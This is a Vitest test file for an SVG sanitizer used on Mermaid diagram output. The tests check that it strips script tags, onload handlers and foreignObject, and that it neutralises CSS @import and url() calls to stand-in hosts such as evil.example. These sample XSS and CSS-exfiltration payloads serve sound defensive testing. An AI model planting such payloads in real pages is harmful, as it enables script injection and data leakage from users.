import { describe, expect, it } from "vitest";
import { sanitizeMermaidSvg } from "../../web/lib/security/sanitizeMermaidSvg";

describe("sanitizeMermaidSvg", () => {
  it("allows basic svg output", () => {
    const svg = '<svg xmlns="http://www.w3.org/2000/svg"><text>ok</text></svg>';
    expect(sanitizeMermaidSvg(svg)).toContain("<text>ok</text>");
  });

  it("strips script tags and event handlers", () => {
    const svg =
      '<svg onload="alert(1)"><script>alert(1)</script><text>ok</text></svg>';
    const cleaned = sanitizeMermaidSvg(svg);
    expect(cleaned).not.toContain("<script");
    expect(cleaned).not.toContain("onload=");
    expect(cleaned).toContain("<text>ok</text>");
  });

  it("rejects non-svg payloads", () => {
    expect(sanitizeMermaidSvg('<div>not svg</div>')).toBe("");
  });

  it("preserves Mermaid's own <style> so nodes render", () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg"><style>.node rect{fill:#ede9fe}</style><text>ok</text></svg>';
    const cleaned = sanitizeMermaidSvg(svg);
    expect(cleaned).toContain("<style>");
    expect(cleaned).toContain("fill:#ede9fe");
  });

  it("neutralizes dangerous CSS inside <style>", () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg"><style>@import url(https://evil.example/x.css); .a{background:url(http://evil/leak)}</style><text>ok</text></svg>';
    const cleaned = sanitizeMermaidSvg(svg);
    expect(cleaned).not.toContain("@import");
    expect(cleaned).not.toContain("url(http");
  });

  it("still strips foreignObject and scripts", () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body>x</body></foreignObject><script>alert(1)</script><text>ok</text></svg>';
    const cleaned = sanitizeMermaidSvg(svg);
    expect(cleaned).not.toContain("<foreignObject");
    expect(cleaned).not.toContain("<script");
  });
});
